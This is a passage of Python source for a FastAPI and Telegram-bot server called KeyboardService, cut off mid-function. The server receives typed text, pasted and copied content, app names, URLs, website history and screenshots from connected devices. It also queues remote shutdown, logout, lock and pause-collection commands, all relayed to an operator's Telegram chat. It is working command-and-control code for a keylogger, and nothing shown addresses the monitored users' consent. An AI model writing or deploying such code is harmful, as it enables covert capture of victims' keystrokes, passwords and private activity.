import asyncio
import base64
import csv
import gzip
import hashlib
import hmac
import html
import io
import json
import os
import time
import urllib.parse
import urllib.request
import uuid
from urllib.error import HTTPError
from contextlib import asynccontextmanager
from collections import deque
from pathlib import Path
from typing import Deque, Dict

from fastapi import FastAPI, Header, Request
from fastapi.responses import FileResponse, JSONResponse, RedirectResponse, Response, StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import psycopg

MAX_MESSAGES = 200
BASE_DIR = Path(__file__).resolve().parent
LOG_PATH = BASE_DIR / "text.txt"
HTML_PATH = BASE_DIR / "web" / "index.html"
messages: Deque[Dict[str, object]] = deque(maxlen=MAX_MESSAGES)
website_history: Deque[Dict[str, object]] = deque(maxlen=500)
devices: Dict[str, Dict[str, object]] = {}
device_online_states: Dict[str, bool] = {}
screenshot_requests: Dict[str, int] = {}
screenshot_commands: Dict[str, str] = {}
device_command_records: Dict[str, Dict[str, object]] = {}
screenshot_statuses: Dict[str, Dict[str, object]] = {}
website_history_statuses: Dict[str, Dict[str, str]] = {}
DATABASE_URL = os.getenv("DATABASE_URL", "").strip()
SUPABASE_URL = os.getenv("SUPABASE_URL", "").strip().rstrip("/")
SUPABASE_SERVICE_ROLE_KEY = os.getenv("SUPABASE_SERVICE_ROLE_KEY", "").strip()
SCREENSHOT_BUCKET = "screenshots"
SERVICE_STARTED_AT = time.time()
DEVICE_HEARTBEAT_INTERVAL = 30
DEVICE_OFFLINE_AFTER = 90
WEBSITE_HISTORY_MAX_AGE_MS = 7 * 24 * 60 * 60 * 1000
SCREENSHOT_STATUS_TIMEOUT = 90
SCREENSHOT_LIST_LIMIT = 30
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "").strip()
APP_USERNAME = os.getenv("APP_USERNAME", "").strip()
APP_PASSWORD = os.getenv("APP_PASSWORD", "").strip()
APP_SESSION_SECRET = os.getenv("APP_SESSION_SECRET", "keyboardservice-secret").strip() or "keyboardservice-secret"
CLIENT_SITE_URL = os.getenv("SITE_URL", "").strip().rstrip("/")
BUY_ME_A_COFFEE_URL = os.getenv(
    "BUY_ME_A_COFFEE_URL", "https://buymeacoffee.com/yourusername"
).strip()
TELEGRAM_UPTIME_INTERVAL = max(
    60, int(os.getenv("TELEGRAM_UPTIME_INTERVAL_SECONDS", "900"))
)


def telegram_configured():
    return bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)


def make_session_token(username: str) -> str:
    signature = hmac.new(APP_SESSION_SECRET.encode("utf-8"), username.encode("utf-8"), hashlib.sha256).hexdigest()
    return f"{username}:{signature}"


def validate_session_token(token: str | None) -> bool:
    if not token or not APP_USERNAME or not APP_PASSWORD:
        return False
    try:
        username, signature = token.split(":", 1)
    except ValueError:
        return False
    expected = make_session_token(APP_USERNAME)
    expected_username, expected_signature = expected.split(":", 1)
    return (
        username == expected_username and
        hmac.compare_digest(signature, expected_signature) and
        username == APP_USERNAME
    )


def auth_is_enabled() -> bool:
    return bool(APP_USERNAME and APP_PASSWORD)


def valid_site_url(value: str) -> bool:
    parsed = urllib.parse.urlparse(value.strip().rstrip("/"))
    return parsed.scheme in {"http", "https"} and bool(parsed.netloc)


def load_client_site_url():
    global CLIENT_SITE_URL
    if not DATABASE_URL:
        return
    try:
        with psycopg.connect(DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                cursor.execute(
                    "SELECT setting_value FROM service_settings WHERE setting_key = %s",
                    ("client_site_url",),
                )
                row = cursor.fetchone()
        if row and valid_site_url(row[0]):
            CLIENT_SITE_URL = row[0].strip().rstrip("/")
    except Exception as error:
        print(f"Could not load client site URL: {error}")


def set_client_site_url(value: str):
    global CLIENT_SITE_URL
    CLIENT_SITE_URL = value.strip().rstrip("/")
    if not DATABASE_URL:
        return
    with psycopg.connect(DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute(
                """
                INSERT INTO service_settings (setting_key, setting_value)
                VALUES (%s, %s)
                ON CONFLICT (setting_key) DO UPDATE SET
                    setting_value = EXCLUDED.setting_value,
                    updated_at = now()
                """,
                ("client_site_url", CLIENT_SITE_URL),
            )


def login_page_html(message: str = ""):
    message_html = f"<div class=\"login-error\">{html.escape(message)}</div>" if message else ""
    return f"""
    <!DOCTYPE html>
    <html lang=\"en\">
    <head>
      <meta charset=\"UTF-8\" />
      <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />
      <title>KeyboardService Login</title>
      <style>
        body {{ font-family: Arial, sans-serif; background: #0b1020; color: #e5eefb; display: grid; place-items: center; min-height: 100vh; margin: 0; }}
        .card {{ width: min(92vw, 420px); background: #131b2d; border: 1px solid #25314a; border-radius: 12px; padding: 28px; box-shadow: 0 16px 40px rgba(0,0,0,0.35); }}
        h1 {{ margin-top: 0; font-size: 26px; }}
        form {{ display: grid; gap: 14px; }}
        label {{ display: grid; gap: 6px; font-weight: 600; }}
        input {{ padding: 12px; border-radius: 8px; border: 1px solid #3d4d6f; background: #0d1528; color: white; }}
        button {{ padding: 12px 16px; border: none; border-radius: 8px; background: #5eb4ff; color: #04111b; font-weight: 700; cursor: pointer; }}
        .login-error {{ color: #ff958c; background: rgba(255,90,90,0.12); border: 1px solid rgba(255,90,90,0.25); padding: 10px; border-radius: 8px; margin-bottom: 8px; }}
      </style>
    </head>
    <body>
      <div class=\"card\">
        <h1>KeyboardService</h1>
        {message_html}
        <form method=\"post\" action=\"/login\">
          <label>
            Username
            <input type=\"text\" name=\"username\" autocomplete=\"username\" required />
          </label>
          <label>
            Password
            <input type=\"password\" name=\"password\" autocomplete=\"current-password\" required />
          </label>
          <button type=\"submit\">Log in</button>
        </form>
      </div>
    </body>
    </html>
    """


def parse_support_methods(value):
    if value.startswith(("http://", "https://")):
        return []

    methods = []
    for entry in value.replace("\n", ";").split(";"):
        if "=" not in entry:
            continue
        name, payment_value = entry.split("=", 1)
        name = name.strip()
        payment_value = payment_value.strip()
        if name and payment_value:
            methods.append({"name": name, "value": payment_value})
    return methods


SUPPORT_METHODS = parse_support_methods(BUY_ME_A_COFFEE_URL)


def telegram_api_request(method, values, timeout=10):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"
    payload = urllib.parse.urlencode(values).encode("utf-8")
    request = urllib.request.Request(url, data=payload, method="POST")
    with urllib.request.urlopen(request, timeout=timeout) as response:
        if response.status >= 400:
            raise RuntimeError(f"Telegram HTTP {response.status}")
        return json.loads(response.read().decode("utf-8"))


def telegram_panel(title, body):
    return f"<b>┌─[ {html.escape(title)} ]</b>\n{body}\n<b>└─[ KeyboardService // ONLINE ]</b>"


def send_telegram_message(text, parse_mode="HTML"):
    if not telegram_configured():
        return

    try:
        values = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
        if parse_mode:
            values["parse_mode"] = parse_mode
        telegram_api_request("sendMessage", values)
    except Exception as error:
        print(f"Could not send Telegram uptime notification: {error}")


def send_telegram_log(message):
    if not telegram_configured():
        return

    text = str(message).strip()
    if not text:
        return
    escaped = html.escape(text)
    try:
        telegram_api_request(
            "sendMessage",
            {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": telegram_panel("LOG // STDOUT", f"<pre>{escaped[:3900]}</pre>"),
                "parse_mode": "HTML",
            },
        )
    except Exception:
        pass


def format_uptime(seconds):
    days, remainder = divmod(max(0, int(seconds)), 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    parts = []
    if days:
        parts.append(f"{days}d")
    if hours or days:
        parts.append(f"{hours}h")
    if minutes or hours or days:
        parts.append(f"{minutes}m")
    parts.append(f"{seconds}s")
    return " ".join(parts)


def telegram_uptime_text():
    return telegram_panel(
        "STATUS // SYSTEM HEALTH",
        "🟢 <b>STATE:</b> HEALTHY\n"
        f"⏱ <b>UPTIME:</b> {format_uptime(time.time() - SERVICE_STARTED_AT)}\n"
        f"🗂 <b>MESSAGES:</b> {len(messages)}\n"
        f"📱 <b>DEVICES:</b> {len(devices)}",
    )


def telegram_devices_text():
    if not devices:
        return telegram_panel("DEVICES // NETWORK", "No devices have checked in yet.")

    now = int(time.time() * 1000)
    online_count = 0
    lines = [f"<b>DEVICES:</b> {len(devices)} total", ""]
    for device in sorted(devices.values(), key=lambda item: str(item.get("name", ""))):
        device_key = str(device.get("id", "unknown"))
        last_seen = int(device.get("last_seen", 0))
        online = device_online_states.get(
            device_key, now - last_seen <= DEVICE_OFFLINE_AFTER * 1000
        )
        if online:
            online_count += 1
        status = "🟢 Online" if online else "🔴 Offline"
        age = format_uptime(max(0, (now - last_seen) // 1000))
        name = html.escape(str(device.get("name", "Unknown device")))
        device_id = html.escape(str(device.get("id", "unknown")))
        lines.append(f"• {status} <b>{name}</b>\n  ID: <code>{device_id}</code>\n  Last seen: {age} ago")
    lines.insert(1, f"🟢 {online_count} online  •  🔴 {len(devices) - online_count} offline")
    return telegram_panel("DEVICES // NETWORK", "\n".join(lines))


def queue_device_command(device_id, command):
    normalized_device_id = str(device_id).strip()
    normalized_command = str(command).strip().lower()
    if not normalized_device_id or normalized_device_id not in devices:
        return False, "Device not found. Use /devices to check the device ID."
    if normalized_command not in {"shutdown", "logout", "restart", "lock", "pause", "resume"}:
        return False, "Unsupported client command."
    command_id = uuid.uuid4().hex
    now = int(time.time() * 1000)
    record = {
        "command_id": command_id,
        "device_id": normalized_device_id,
        "command": normalized_command,
        "requested_by": "dashboard",
        "source": "dashboard",
        "status": "queued",
        "created_at": now,
        "claimed_at": None,
        "completed_at": None,
        "error": "",
    }
    device_command_records[command_id] = record
    if DATABASE_URL:
        try:
            with psycopg.connect(DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute(
                        """
                        INSERT INTO device_commands
                            (command_id, device_id, command, requested_by, source, status, created_at)
                        VALUES (%s, %s, %s, %s, %s, %s, %s)
                        """,
                        (command_id, normalized_device_id, normalized_command, "dashboard", "dashboard", "queued", now),
                    )
        except Exception as error:
            print(f"Could not persist device command: {error}")
    else:
        screenshot_commands[normalized_device_id] = normalized_command
    audit_event("device_command_queued", device_id=normalized_device_id, details={"command_id": command_id, "command": normalized_command})
    return True, command_id


def audit_event(event_type, actor="system", source="server", device_id="", details=None):
    if not DATABASE_URL:
        return
    try:
        with psycopg.connect(DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                cursor.execute(
                    """
                    INSERT INTO audit_events (event_type, actor, source, device_id, details, created_at)
                    VALUES (%s, %s, %s, %s, %s::jsonb, %s)
                    """,
                    (event_type, actor, source, device_id, json.dumps(details or {}), int(time.time() * 1000)),
                )
    except Exception as error:
        print(f"Could not save audit event: {error}")


def claim_device_command(device_id):
    normalized_device_id = str(device_id).strip()
    if DATABASE_URL:
        try:
            with psycopg.connect(DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute(
                        """
                        SELECT command_id, device_id, command, requested_by, source, status, created_at, claimed_at, completed_at, error
                        FROM device_commands
                        WHERE device_id = %s AND status = 'queued'
                        ORDER BY created_at ASC
                        LIMIT 1
                        FOR UPDATE SKIP LOCKED
                        """,
                        (normalized_device_id,),
                    )
                    row = cursor.fetchone()
                    if not row:
                        return None
                    claimed_at = int(time.time() * 1000)
                    cursor.execute(
                        "UPDATE device_commands SET status = 'claimed', claimed_at = %s WHERE command_id = %s",
                        (claimed_at, row[0]),
                    )
            return {
                "command_id": row[0], "device_id": row[1], "command": row[2],
                "requested_by": row[3], "source": row[4], "status": "claimed",
                "created_at": row[6], "claimed_at": claimed_at, "completed_at": row[8], "error": row[9],
            }
        except Exception as error:
            print(f"Could not claim device command: {error}")
    command = screenshot_commands.pop(normalized_device_id, None)
    if not command:
        return None
    for record in device_command_records.values():
        if record["device_id"] == normalized_device_id and record["command"] == command and record["status"] == "queued":
            record["status"] = "claimed"
            record["claimed_at"] = int(time.time() * 1000)
            return record
    return None


def list_device_commands(device_id, limit=50):
    if DATABASE_URL:
        try:
            with psycopg.connect(DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute(
                        "SELECT command_id, device_id, command, requested_by, source, status, created_at, claimed_at, completed_at, error FROM device_commands WHERE device_id = %s ORDER BY created_at DESC LIMIT %s",
                        (device_id, min(max(limit, 1), 100)),
                    )
                    rows = cursor.fetchall()
            return [dict(zip(("command_id", "device_id", "command", "requested_by", "source", "status", "created_at", "claimed_at", "completed_at", "error"), row)) for row in rows]
        except Exception as error:
            print(f"Could not list device commands: {error}")
    return [record for record in sorted(device_command_records.values(), key=lambda item: item["created_at"], reverse=True) if record["device_id"] == device_id][:limit]


def telegram_controls_markup():
    rows = []
    for device in sorted(devices.values(), key=lambda item: str(item.get("name", ""))):
        device_id = str(device.get("id", ""))
        if not device_id:
            continue
        name = str(device.get("name", "Unknown device"))[:20]
        rows.append([
            {"text": f"Shut down {name}", "callback_data": f"control:shutdown:{device_id}"},
            {"text": f"Log out {name}", "callback_data": f"control:logout:{device_id}"},
        ])
        rows.append([
            {"text": f"Restart {name}", "callback_data": f"control:restart:{device_id}"},
            {"text": f"Pause {name}", "callback_data": f"control:pause:{device_id}"},
        ])
    return {"inline_keyboard": rows}


def telegram_controls_text():
    if not devices:
        return telegram_panel("CONTROLS // CLIENTS", "No devices have checked in yet.")
    lines = [
        "Choose a client action below, or use:",
        "<code>/shutdown DEVICE_ID</code>",
        "<code>/logout DEVICE_ID</code>",
        "",
    ]
    for device in sorted(devices.values(), key=lambda item: str(item.get("name", ""))):
        device_id = html.escape(str(device.get("id", "unknown")))
        name = html.escape(str(device.get("name", "Unknown device")))
        lines.append(f"• <b>{name}</b> — <code>{device_id}</code>")
    return telegram_panel("CONTROLS // CLIENTS", "\n".join(lines))


def telegram_device_text(device_id):
    normalized_device_id = str(device_id).strip()
    device = devices.get(normalized_device_id)
    if not device:
        return telegram_panel("DEVICE // NOT FOUND", "Use /devices to check the device ID.")
    now = int(time.time() * 1000)
    last_seen = int(device.get("last_seen", 0))
    online = device_online_states.get(normalized_device_id, now - last_seen <= DEVICE_OFFLINE_AFTER * 1000)
    commands = list_device_commands(normalized_device_id, 5)
    command_lines = "\n".join(
        f"• {html.escape(str(item['command']))}: <b>{html.escape(str(item['status']))}</b>"
        for item in commands
    ) or "No commands yet."
    return telegram_panel(
        "DEVICE // DETAIL",
        f"<b>NAME:</b> {html.escape(str(device.get('name', 'Unknown device')))}\n"
        f"<b>ID:</b> <code>{html.escape(normalized_device_id)}</code>\n"
        f"<b>STATUS:</b> {'🟢 Online' if online else '🔴 Offline'}\n"
        f"<b>LAST HEARTBEAT:</b> {format_uptime(max(0, (now - last_seen) // 1000))} ago\n"
        f"<b>USER:</b> {html.escape(str(device.get('logged_in_user', 'Unknown user')))}\n"
        f"<b>BATTERY:</b> {html.escape(str(device.get('battery_status', 'Unknown')))} {device.get('battery_percent') or ''}%\n\n"
        f"<b>RECENT COMMANDS</b>\n{command_lines}",
    )


def telegram_messages_text():
    counts = {}
    for item in messages:
        device_name = str(item.get("device_name", "Unknown device"))
        counts[device_name] = counts.get(device_name, 0) + 1
    lines = [f"<b>TOTAL STORED:</b> {len(messages)}"]
    if counts:
        lines.append("")
        lines.append("<b>BY DEVICE</b>")
        lines.extend(
            f"• {html.escape(name)}: <b>{count}</b>" for name, count in sorted(counts.items())
        )
    else:
        lines.append("")
        lines.append("No messages stored yet.")
    return telegram_panel("MESSAGES // BUFFER", "\n".join(lines))


def telegram_help_text():
    return telegram_panel(
        "HELP // COMMANDS",
        "Monitor your service and connected devices.\n\n"
        "<b>COMMANDS</b>\n"
        "🏠 /start — welcome screen\n"
        "📊 /status — health and uptime\n"
        "📱 /devices — device status\n"
        "🔎 /device DEVICE_ID — device detail\n"
        "🎛️ /controls — show device controls\n"
        "⏻ /shutdown DEVICE_ID — shut down a client\n"
        "🔒 /logout DEVICE_ID — log out a client\n"
        "🔁 /restart DEVICE_ID — restart a client\n"
        "🔐 /lock DEVICE_ID — lock a client\n"
        "⏸️ /pause DEVICE_ID — pause collection\n"
        "▶️ /resume DEVICE_ID — resume collection\n"
        "📸 /screenshot DEVICE_ID — request a screenshot\n"
        "📨 /messages — stored message totals\n"
        "🔗 /setsite URL — update the client service URL\n"
        "💛 /support — support options\n"
        "❓ /help — command list",
    )


def telegram_start_text():
    return telegram_panel(
        "BOOT // KEYBOARDSERVICE",
        "👋 Connection established.\n\n"
        "Your keyboard clients and live message feed are ready.\n\n"
        "Built by <b>Petroholic</b>\n\n"
        "Choose an option below.",
    )


def telegram_menu_markup():
    return {
        "inline_keyboard": [
            [
                {"text": "Service status", "callback_data": "status"},
                {"text": "Connected devices", "callback_data": "devices"},
            ],
            [
                {"text": "Message summary", "callback_data": "messages"},
                {"text": "Basic controls", "callback_data": "controls"},
            ],
            [
                {"text": "Support", "callback_data": "support"},
            ],
            [{"text": "Help", "callback_data": "help"}],
        ]
    }


def telegram_support_text():
    if SUPPORT_METHODS:
        lines = ["<b>SUPPORT CHANNELS</b>", ""]
        for method in SUPPORT_METHODS:
            name = html.escape(method["name"])
            value = html.escape(method["value"])
            lines.append(f"<b>{name}</b>\n<code>{value}</code>")
        return telegram_panel("SUPPORT // FUND THE PROJECT", "\n\n".join(lines))
    return telegram_panel("SUPPORT // FUND THE PROJECT", html.escape(BUY_ME_A_COFFEE_URL))


def configure_telegram_menu():
    try:
        telegram_api_request(
            "deleteWebhook", {"drop_pending_updates": "false"}
        )
        command_result = telegram_api_request(
            "setMyCommands",
            {
                "scope": json.dumps({"type": "chat", "chat_id": TELEGRAM_CHAT_ID}),
                "commands": json.dumps(
                    [
                        {"command": "start", "description": "Welcome to KeyboardService"},
                        {"command": "help", "description": "Show available commands"},
                        {"command": "status", "description": "Show service health and uptime"},
                        {"command": "devices", "description": "List connected devices"},
                        {"command": "device", "description": "Show one device detail"},
                        {"command": "controls", "description": "Show basic device controls"},
                        {"command": "shutdown", "description": "Shut down a client by device ID"},
                        {"command": "logout", "description": "Log out a client by device ID"},
                        {"command": "restart", "description": "Restart a client by device ID"},
                        {"command": "lock", "description": "Lock a client by device ID"},
                        {"command": "pause", "description": "Pause collection by device ID"},
                        {"command": "resume", "description": "Resume collection by device ID"},
                        {"command": "screenshot", "description": "Request a client screenshot"},
                        {"command": "messages", "description": "Show stored message totals"},
                        {"command": "setsite", "description": "Change the desktop client service URL"},
                        {"command": "support", "description": "Show support options"},
                    ]
                )
            },
        )
        if not command_result.get("ok"):
            raise RuntimeError(f"Telegram rejected command menu: {command_result}")
        print("Telegram command menu registered: /controls included")
    except Exception as error:
        print(f"Could not configure Telegram command menu: {error}")


def poll_telegram_commands():
    offset = None
    configure_telegram_menu()
    conflict_logged = False
    while True:
        try:
            values = {"timeout": 25}
            if offset is not None:
                values["offset"] = offset
            response = telegram_api_request("getUpdates", values, timeout=35)
            for update in response.get("result", []):
                offset = int(update["update_id"]) + 1
                callback_query = update.get("callback_query")
                if callback_query:
                    callback_message = callback_query.get("message", {})
                    callback_chat = callback_message.get("chat", {})
                    if str(callback_chat.get("id")) != TELEGRAM_CHAT_ID:
                        continue
                    callback_replies = {
                        "status": telegram_uptime_text,
                        "devices": telegram_devices_text,
                        "controls": telegram_controls_text,
                        "messages": telegram_messages_text,
                        "support": telegram_support_text,
                        "help": telegram_help_text,
                    }
                    callback_data = callback_query.get("data", "")
                    if callback_data.startswith("control:"):
                        _, action, device_id = callback_data.split(":", 2)
                        succeeded, result = queue_device_command(device_id, action)
                        callback_reply = lambda: telegram_panel(
                            f"CLIENT // {action.upper()}",
                            f"Command queued for <code>{html.escape(result)}</code>."
                            if succeeded else html.escape(result),
                        )
                    else:
                        callback_reply = callback_replies.get(callback_data)
                    if callback_reply:
                        telegram_api_request(
                            "answerCallbackQuery",
                            {"callback_query_id": callback_query["id"]},
                        )
                        telegram_api_request(
                            "sendMessage",
                            {
                                "chat_id": TELEGRAM_CHAT_ID,
                                "text": callback_reply(),
                                "parse_mode": "HTML",
                                "reply_markup": json.dumps(telegram_menu_markup()),
                            },
                        )
                    continue
                message = update.get("message", {})
                chat = message.get("chat", {})
                text = (message.get("text") or "").strip()
                if str(chat.get("id")) != TELEGRAM_CHAT_ID:
                    continue
                command = text.split()[0] if text else ""
                command = command.split("@", 1)[0]
                command_lower = command.lower()
                reply = None
                if command_lower == "/start":
                    telegram_api_request(
                        "sendMessage",
                        {
                            "chat_id": TELEGRAM_CHAT_ID,
                            "text": telegram_panel(
                                "SHELL // MENU RESET",
                                "Inline command interface restored.",
                            ),
                            "parse_mode": "HTML",
                            "reply_markup": json.dumps({"remove_keyboard": True}),
                        },
                    )
                    reply = telegram_start_text()
                elif command_lower == "/help":
                    reply = telegram_help_text()
                elif command_lower in {"/uptime", "/status"}:
                    reply = telegram_uptime_text()
                elif command_lower == "/devices":
                    reply = telegram_devices_text()
                elif command_lower == "/device":
                    reply = telegram_device_text(text[len(command):].strip())
                elif command_lower == "/controls":
                    reply = telegram_controls_text()
                elif command_lower in {"/shutdown", "/logout"}:
                    requested_device_id = text[len(command):].strip()
                    action = command_lower[1:]
                    succeeded, result = queue_device_command(requested_device_id, action)
                    reply = telegram_panel(
                        f"CLIENT // {action.upper()}",
                        f"Command queued for <code>{html.escape(result)}</code>."
                        if succeeded else html.escape(result),
                    )
                elif command_lower in {"/restart", "/lock", "/pause", "/resume"}:
                    requested_device_id = text[len(command):].strip()
                    action = command_lower[1:]
                    succeeded, result = queue_device_command(requested_device_id, action)
                    reply = telegram_panel(
                        f"CLIENT // {action.upper()}",
                        f"Command queued: <code>{html.escape(result)}</code>"
                        if succeeded else html.escape(result),
                    )
                elif command_lower == "/screenshot":
                    requested_device_id = text[len(command):].strip()
                    if requested_device_id not in devices:
                        reply = telegram_panel("SCREENSHOT // FAILED", "Device not found. Use /devices to check the device ID.")
                    else:
                        screenshot_requests[requested_device_id] = int(time.time() * 1000)
                        reply = telegram_panel("SCREENSHOT // QUEUED", f"Screenshot requested for <code>{html.escape(requested_device_id)}</code>.")
                elif command_lower == "/messages":
                    reply = telegram_messages_text()
                elif command_lower == "/setsite":
                    requested_url = text[len(command):].strip()
                    if not valid_site_url(requested_url):
                        reply = telegram_panel(
                            "CLIENT URL // INVALID",
                            "Usage: <code>/setsite https://your-service.onrender.com</code>",
                        )
                    else:
                        try:
                            set_client_site_url(requested_url)
                            reply = telegram_panel(
                                "CLIENT URL // UPDATED",
                                f"Desktop clients will switch to <code>{html.escape(CLIENT_SITE_URL)}</code> on their next heartbeat.",
                            )
                        except Exception as error:
                            print(f"Could not save client site URL: {error}")
                            reply = telegram_panel(
                                "CLIENT URL // FAILED",
                                "Could not save the URL. Check DATABASE_URL and run migrations/000_all.sql.",
                            )
                elif command_lower in {"/support", "/buymeacoffee"}:
                    reply = telegram_support_text()
                if reply:
                    telegram_api_request(
                        "sendMessage",
                        {
                            "chat_id": TELEGRAM_CHAT_ID,
                            "text": reply,
                            "parse_mode": "HTML",
                            "reply_markup": json.dumps(
                                telegram_controls_markup() if command_lower == "/controls" else telegram_menu_markup()
                            ),
                        },
                    )
        except HTTPError as error:
            if error.code == 409:
                if not conflict_logged:
                    print(
                        "Telegram command polling is already active elsewhere; "
                        "stop the other bot process to enable /buymeacoffee."
                    )
                    conflict_logged = True
                time.sleep(30)
                continue
            print(f"Could not process Telegram commands: {error}")
            time.sleep(5)
        except Exception as error:
            print(f"Could not process Telegram commands: {error}")
            time.sleep(5)


def notify_device_status(device_id, device_name, online):
    status = "🟢 online" if online else "🔴 offline"
    send_telegram_message(
        telegram_panel(
            "ALERT // DEVICE STATUS",
            f"{status} • <b>{html.escape(device_name)}</b>\n"
            f"ID: <code>{html.escape(device_id)}</code>",
        )
    )


async def device_status_loop():
    while True:
        await asyncio.sleep(DEVICE_HEARTBEAT_INTERVAL)
        now = int(time.time() * 1000)
        for device in list(devices.values()):
            device_id = str(device["id"])
            if device_online_states.get(device_id) is False:
                continue
            last_seen = int(device.get("last_seen", 0))
            online = now - last_seen <= DEVICE_OFFLINE_AFTER * 1000
            previous = device_online_states.get(device_id)
            device_online_states[device_id] = online
            if previous is True and not online:
                await asyncio.to_thread(
                    notify_device_status,
                    device_id,
                    device.get("name", "Unknown device"),
                    False,
                )


async def telegram_uptime_loop():
    await asyncio.to_thread(
        send_telegram_message,
        telegram_panel(
            "BOOT // SERVICE ONLINE",
            "🟢 Link established. Built by <b>Petroholic</b>.",
        ),
    )
    while True:
        await asyncio.sleep(TELEGRAM_UPTIME_INTERVAL)
        await asyncio.to_thread(
            send_telegram_message,
            telegram_panel(
                "PING // HEARTBEAT",
                "🟢 <b>STATE:</b> HEALTHY\n"
                f"⏱ <b>RUNTIME:</b> {format_uptime(time.time() - SERVICE_STARTED_AT)}",
            ),
        )


@asynccontextmanager
async def lifespan(_app):
    heartbeat_task = None
    telegram_command_task = None
    device_status_task = asyncio.create_task(device_status_loop())
    if telegram_configured():
        heartbeat_task = asyncio.create_task(telegram_uptime_loop())
        telegram_command_task = asyncio.create_task(
            asyncio.to_thread(poll_telegram_commands)
        )
    elif TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID:
        print("Telegram uptime notifications need both TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")

    try:
        yield
    finally:
        tasks = [device_status_task]
        if heartbeat_task:
            tasks.append(heartbeat_task)
        if telegram_command_task:
            telegram_command_task.cancel()
            tasks.append(telegram_command_task)
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)


def load_file_messages():
    try:
        with LOG_PATH.open("r", encoding="utf-8") as f:
            lines = [line.strip() for line in f.read().splitlines() if line.strip()]
    except FileNotFoundError:
        return []

    parsed = []
    for line in lines:
        if "|" not in line:
            continue
        parts = line.split("|", 5)
        try:
            if len(parts) == 2:
                ts, text = parts
                device_id = "unknown"
                device_name = "Unknown device"
                is_pasted = False
                is_copied = False
            elif len(parts) == 5:
                ts, device_id, device_name, pasted_value, text = parts
                is_pasted = pasted_value == "1"
                is_copied = False
            elif len(parts) == 6:
                ts, device_id, device_name, pasted_value, copied_value, text = parts
                is_pasted = pasted_value == "1"
                is_copied = copied_value == "1"
            else:
                ts, device_id, device_name, text = parts
                is_pasted = False
                is_copied = False
            parsed.append(
                {
                    "id": int(ts),
                    "text": text.strip(),
                    "raw_text": text.strip(),
                    "raw_only": False,
                    "time": int(ts),
                    "device_id": device_id,
                    "device_name": device_name,
                    "app_name": "Unknown app",
                    "is_pasted": is_pasted,
                    "is_copied": is_copied,
                }
            )
        except ValueError:
            continue
    return parsed


def load_text_messages():
    global messages
    parsed = []
    if DATABASE_URL:
        try:
            with psycopg.connect(DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute(
                        """
                        SELECT id, text, raw_text, raw_only, device_id, device_name, app_name, source_url, time, is_pasted, is_copied
                        FROM messages
                        ORDER BY time DESC
                        LIMIT %s
                        """,
                        (MAX_MESSAGES,),
                    )
                    rows = cursor.fetchall()
            parsed = [
                {
                    "id": row[0],
                    "text": row[1],
                    "raw_text": row[2] or row[1],
                    "raw_only": row[3],
                    "device_id": row[4],
                    "device_name": row[5],
                    "app_name": row[6],
                    "source_url": row[7] or "",
                    "time": row[8],
                    "is_pasted": row[9],
                    "is_copied": row[10],
                }
                for row in reversed(rows)
            ]
        except Exception as error:
            print(f"Could not load Supabase messages: {error}")

    if not parsed:
        parsed = load_file_messages()
    messages = deque(parsed[-MAX_MESSAGES:], maxlen=MAX_MESSAGES)
    for item in messages:
        devices[str(item["device_id"])] = {
            "id": item["device_id"],
            "name": item["device_name"],
            "last_seen": item["time"],
            "started_at": item["time"],
            "joined_at": item["time"],
        }


def load_devices():
    if not DATABASE_URL:
        return

    try:
        with psycopg.connect(DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                cursor.execute(
                    """
                    SELECT device_id, device_name, last_seen, started_at, joined_at
                    FROM devices
                    ORDER BY last_seen DESC
                    """
                )
                rows = cursor.fetchall()
        for device_id, device_name, last_seen, started_at, joined_at in rows:
            devices[str(device_id)] = {
                "id": device_id,
                "name": device_name,
                "last_seen": last_seen,
                "started_at": started_at,
                "joined_at": joined_at,
            }
            device_online_states[str(device_id)] = (
                int(time.time() * 1000) - int(last_seen)
                <= DEVICE_OFFLINE_AFTER * 1000
            )
    except Exception as error:
        print(f"Could not load Supabase devices: {error}")


def save_message(item):
    if any(existing.get("id") == item["id"] for existing in messages):
        return False
    if not DATABASE_URL:
        write_text_log()
        return True

    with psycopg.connect(DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute(
                """
                INSERT INTO messages (id, text, raw_text, raw_only, device_id, device_name, app_name, source_url, time, is_pasted, is_copied)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                ON CONFLICT (id) DO NOTHING
                """,
                (
                    item["id"],
                    item["text"],
                    item["raw_text"],
                    item["raw_only"],
                    item["device_id"],
                    item["device_name"],
                    item["app_name"],
                    item["source_url"],
                    item["time"],
                    item["is_pasted"],
                    item["is_copied"],
                ),
            )
            return cursor.rowcount > 0


def save_device(device_id, device_name, last_seen, started_at, joined_at, telemetry=None):
    telemetry = telemetry or {}
    previous = devices.get(device_id, {})
    local_time_ms = telemetry.get("local_time_ms")
    if not isinstance(local_time_ms, (int, float)) or local_time_ms < 100000000000:
        local_time_ms = previous.get("local_time_ms")
    devices[device_id] = {
        "id": device_id,
        "name": device_name,
        "last_seen": last_seen,
        "started_at": started_at,
        "joined_at": joined_at,
        "local_time": telemetry.get("local_time") or previous.get("local_time", ""),
        "local_time_ms": local_time_ms,
        "logged_in_user": telemetry.get("logged_in_user") or previous.get("logged_in_user", ""),
